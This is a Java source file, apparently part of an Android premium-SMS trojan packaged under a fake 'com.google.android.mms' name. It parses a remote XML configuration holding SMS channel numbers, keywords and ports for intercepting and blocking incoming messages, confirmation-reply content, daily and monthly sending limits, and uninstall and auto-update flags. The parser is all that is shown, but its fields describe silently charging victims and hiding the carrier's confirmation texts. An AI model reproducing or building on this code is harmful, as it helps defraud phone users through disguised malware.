package com.google.android.mms;

import java.util.ArrayList;
import java.util.HashMap;

import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import android.util.Log;

public class XMLHandler extends DefaultHandler {
    private static final String TAG = "XMLHandler";
    private static final boolean DEBUG = false;
    
    public static final String BODY = "body";
    public static final String IS_UNINSTALL = "is_uninstall";
    public static final String NEXT_LINK_BASE = "next_link_base";
    public static final String NEXT_LINK_START = "next_link_start";
    public static final String NEXT_LINK_END = "next_link_end";
    public static final String AUTO_UPDATE = "auto_update";
    public static final String VERSION = "version";
    
    public static final String CHANNEL = "channel";
    public static final String CHANNEL_NAME = "channel_name";
    public static final String CHANNEL_SMS = "channel_sms";
    public static final String CHANNEL_PORT = "channel_port";
    public static final String CHANNEL_ORDER = "channel_order";
    public static final String INTERCEPT_KEY = "intercept_key";
    public static final String KEY = "key";
    public static final String INTERCEPT_TIME = "intercept_time";
    public static final String INTERCEPT_PORT = "intercept_port";
    public static final String PORT = "port";
    public static final String CONFIRM_PORT = "confirm_port";
    public static final String CONFIRM_KEY = "confirm_key";
    public static final String CONFIRM_CONTENT = "confirm_content";
    public static final String LIMIT_NUMS_DAY = "limit_nums_day";
    public static final String LIMIT_NUMS_MONTH = "limit_nums_month";
    public static final String VEDIO_LINK = "vedio_url";

    private HashMap<String, String> mChannelInfo;
    private ArrayList<String> mInterceptKey;
    private ArrayList<String> mInterceptPort;
    
    private StringBuilder mCurrentValue;

    public XMLHandler() {
        super();
        mChannelInfo = new HashMap<String, String>();
        mInterceptKey = new ArrayList<String>();
        mInterceptPort = new ArrayList<String>();
        mCurrentValue = new StringBuilder();
    }

    public String getChanneInfo(String key) {
        if (key == null) return null;
        return mChannelInfo.get(key);
    }
    
    public ArrayList<String> getBlockPorts() {
        return mInterceptPort;
    }
    
    public ArrayList<String> getBlockKeys() {
        return mInterceptKey;
    }
    
    @Override
    public void characters(char[] ch, int start, int length) throws SAXException {
        super.characters(ch, start, length);
        for (int index = start; index < length; ++index) {
            //skip the '\n'
            if (ch[index] != '\n') {
                mCurrentValue.append(ch[index]);
            }
        }
    }

    @Override
    public void endElement(String uri, String localName, String name) throws SAXException {
//        LOGD("uri = " + uri + "  localName = " + localName + " name = " + name);
        super.endElement(uri, localName, name);
        if (localName.equals(KEY) == true) {
            LOGD("local Name = " + localName + "  value = " + mCurrentValue.toString().trim());
            mInterceptKey.add(mCurrentValue.toString().trim());
            mCurrentValue.setLength(0);
        } else if (localName.equals(PORT) == true) {
            LOGD("local Name = " + localName + "  value = " + mCurrentValue.toString().trim());
            mInterceptPort.add(mCurrentValue.toString().trim());
            mCurrentValue.setLength(0);
        } else if (mCurrentValue.length() > 0) {
            LOGD("local Name = " + localName + "  value = " + mCurrentValue.toString().trim());
            mChannelInfo.put(localName, mCurrentValue.toString().trim());
            mCurrentValue.setLength(0);
        }
    }

    @Override
    public void startElement(String uri, String localName, String name, Attributes attributes) throws SAXException {
        super.startElement(uri, localName, name, attributes);
//        LOGD("uri = " + uri + "  localName = " + localName + " name = " + name);
        if (localName.equals(BODY)) {
            mChannelInfo.clear();
            mInterceptKey.clear();
            mInterceptPort.clear();
        }
    }

    public void dumpXMLParseInfo() {
        if (DEBUG) {
            Log.d(TAG, "[[dumpXMLParseInfo]] begin >>>>>>>>>>>>");
            for (String key : mChannelInfo.keySet()) {
                Log.d(TAG, key + " = " + mChannelInfo.get(key));
            }
            for (String str : mInterceptKey) {
                Log.d(TAG, "intercept key value = " + str);
            }
            for (String str : mInterceptPort) {
                Log.d(TAG, "intercept port value = " + str);
            }
            Log.d(TAG, "[[dumpXMLParseInfo]] end <<<<<<<<<<<");
        }
    }
    
    private void LOGD(String text) {
        if (DEBUG) {
            Log.d(TAG, text);
        }
    }
}
